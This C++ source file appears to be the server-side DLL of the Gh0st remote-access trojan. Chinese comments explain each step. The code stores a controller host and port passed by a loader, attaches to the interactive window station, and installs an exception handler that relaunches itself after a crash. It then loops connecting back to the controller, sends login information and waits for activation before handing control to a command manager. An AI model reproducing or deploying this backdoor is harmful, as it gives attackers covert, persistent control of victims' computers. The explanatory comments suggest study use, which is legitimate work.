// ServerDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "ClientSocket.h"
#include "Login.h"
#include "KernelManager.h"
#include "resource.h"


enum
{
	    NOT_CONNECT,                //  还没有连接
		GETLOGINFO_ERROR,
		CONNECT_ERROR,
		HEARTBEATTIMEOUT_ERROR
};


char  g_strSvchostName[MAX_PATH];
char  g_strHost[MAX_PATH];
DWORD g_dwPort;
DWORD g_dwServiceType;

HINSTANCE g_hInstance = NULL;

DWORD WINAPI MyMain(char *lpServiceName);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo);
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
	    g_hInstance = (HINSTANCE)hModule;


		break;
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



extern "C" __declspec(dllexport) void TestRun(char* strHost,int nPort )
{
	strcpy(g_strHost,strHost);    //保存上线地址    //这里的两个值都是由加载程序Exe传入的
	g_dwPort = nPort;             //保存上线端口
	HANDLE hThread = MyCreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MyMain, 
		(LPVOID)g_strHost,0,NULL);                //这里构建了一个自己的创建线程函数

	



	//这里等待线程结束
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);     
}


DWORD WINAPI MyMain(char *lpServiceName)
{
	char	strServiceName[256] = {0};     //主控制端的IP 
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
	HANDLE	hEvent = NULL;

	// Set Window Station
	//--这里是同窗口交互
	HWINSTA hOldStation = GetProcessWindowStation();    //功能获取一个句柄,调用进程的当前窗口
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);   //　打开指定的窗口站  XP的默认窗口站
	if (hWinSta != NULL)
	{
		SetProcessWindowStation(hWinSta);   //设置本进程窗口为winsta0  // 分配一个窗口站给调用进程，以便该进程能够访问窗口站里的对象，如桌面、剪贴板和全局原子
	}



	if (g_hInstance != NULL)   //g_hInstance 该值要在Dll的入口进行赋值
	{
		//自己设置了一个访问违规的错误处理函数 如果发生了错误 操作系统就会调用bad_exception
		SetUnhandledExceptionFilter(bad_exception);  //这里就是错误处理的回调函数了
		
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 随机事件名
		
		hInstallMutex = CreateMutex(NULL,true,g_strHost);  //该互斥体是只允许一台PC拥有一个实例
	}


	CClientSocket socketClient;    //初始化套接字库
	

	BYTE  bBreakError = NOT_CONNECT;

	char	*lpszHost = NULL;
	DWORD	dwPort    = 0;

	while (1)
	{
		if (bBreakError != NOT_CONNECT)
		{


		}

		lpszHost = g_strHost;    //主控制端的IP
		dwPort   = g_dwPort;     //上线的端口


		DWORD dwTickCount = GetTickCount();   //5
		//调用Connect函数向主控端发起连接
		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;       //连接错误跳出本次循环  等待再次连接  一旦连接成功后向我们的主控制发送登陆请求
			continue;
		}

		DWORD dwExitCode = SOCKET_ERROR;      //GetTickCount() - dwTickCount 计算网速的 没有太大意思
		SendLoginInfo(strServiceName, &socketClient, 
			GetTickCount() - dwTickCount); //strServiceName主控制端的IP
                               //父类this
		CKernelManager	Manager(&socketClient, strServiceName, 
			g_dwServiceType, strKillEvent, lpszHost, dwPort);   //注意这里CKernelManager 是CManager的子类
		socketClient.setManagerCallBack(&Manager);              //向socketClient类中的成员表赋值

		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !Manager.IsActived()); i++)
		{
			Sleep(1000);   //等待我们的工作线程中OnRead函数进行处理 ClientSocket.cp 文件中
		}
		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!Manager.IsActived())
		{
			continue;
		}


		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();
		
		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);   //该事件是在UnInstallService中被创建
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);

			//到这里我们的被控端都会被限制在这里循环中


		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
		
		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}

	}
		
	return 0;
}




// 发生异常，重新创建进程
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) 
{

	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MyMain,
		(LPVOID)g_strSvchostName, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}